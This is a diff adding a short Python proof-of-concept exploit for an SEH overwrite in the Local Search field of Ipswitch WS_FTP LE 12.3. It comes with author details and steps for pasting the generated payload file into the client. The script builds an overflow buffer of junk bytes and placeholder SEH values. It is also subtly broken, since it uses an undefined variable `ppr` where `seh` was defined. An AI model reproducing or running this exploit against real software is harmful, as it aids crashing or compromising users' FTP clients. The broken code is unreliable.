@@ -1,0 +1,25 @@
+#!/usr/bin/python
+#Author: Zahid Adeel
+#Author Email: exploiter.zee@gmail.com
+#Title: Ipswitch WS_FTP LE 12.3 - Search field SEH Overwrite POC
+#Vendor Homepage: http://www.wsftple.com/ 
+#Software Link: http://www.wsftple.com/download.aspx
+#Version: LE 12.3
+#Tested on: Windows 8.1 x64 Pro
+#Date: 2016-05-10
+
+#Steps:
+#Run WS_FTP LE client, Navigate to "Local Search" option in the Tools menu, paste the contents of wsftple-poc.txt in search field and press Enter.
+
+fname="wsftple-poc.txt"
+
+junk = "A" * 840
+n_seh = "BBBB"
+seh = "CCCC"
+
+padding = "F" * (1000 - len(junk) - 8)
+poc = junk + n_seh + ppr + padding
+
+fhandle = open(fname , 'wb')
+fhandle.write(poc)
+fhandle.close()
